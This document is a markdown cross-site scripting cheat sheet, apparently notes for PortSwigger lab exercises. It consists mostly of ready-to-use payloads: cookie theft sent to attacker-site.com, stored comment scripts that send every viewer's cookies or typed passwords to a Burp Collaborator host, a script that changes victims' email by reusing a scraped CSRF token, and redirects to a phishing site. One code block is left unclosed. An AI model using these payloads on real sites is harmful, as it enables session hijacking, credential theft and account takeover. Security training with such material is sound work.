## XSS

![XSS-variants](https://github.com/user-attachments/assets/0f908703-6b48-4424-acb2-7487e776765d)

### Basics:
```
<§§>                                 --//https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
<script>alert(1)</script>
<custom-tag> or <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
http://foo?&apos;-alert(1)-&apos;    --//write into the "website input" (comments)
javascript:alert(1)
"onmouseover="alert(1)
\'-alert(1)//
<svg/onload=prompt(1337);>
<><img src=1 onerror=alert(1)>       --// the website uses the JavaScript replace() function to encode angle brackets
\"-alert(1)}//                       --// the string is reflected in a JSON response called search-results
{{$on.constructor('alert(1)')()}}    --// if your random string is enclosed in an ng-app directive.
```

### Obtain cookies or tokens:

```
fetch('https://attacker-site.com/steal-cookies?cookie=' + encodeURIComponent(document.cookie));

<img src=x onerror="fetch('https://attacker-site.com/?c='+document.cookie)">

<script>eval(String.fromCharCode(102,101,116,99,104,40,39,104...));</script>

<script>(()=>{fetch('https://attacker-site.com/?c='+document.cookie)})()</script>

<script src="https://attacker-site.com/malicious.js"></script> //import from another site

let img = new Image();
img.src = 'https://attacker-site.com/log?cookie=' + encodeURIComponent(document.cookie);

navigator.sendBeacon('https://attacker-site.com/steal-cookies', 'cookie=' + encodeURIComponent(document.cookie));

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
--------------------------------------------
#### post this in the comment section - it will send all cookies for all viewers this comment:
```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
### XSS redirect to another site options:
```
--------------------------------------------
#### post this payload in the blog comment section - 
script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server:
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
--------------------------------------------
#### Submit the following payload in the comment section
This will make anyone who views the comment issue a POST request to change their email address to test@test.com:
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
--------------------------------------------
### XSS to redirect or view another site on the target site:
```
<script>window.location.href = "https://phishing-site.com";</script>

<script>window.location.replace("https://phishing-site.com");</script>

<script>window.location.assign("https://phishing-site.com");</script>

<meta http-equiv="refresh" content="0;url=https://phishing-site.com">

<body onload="window.location.href='https://phishing-site.com'">

<a href="#" onclick="window.location.href='https://phishing-site.com'">Click here</a>

<iframe src="https://phishing-site.com" style="display:none;"></iframe>
```
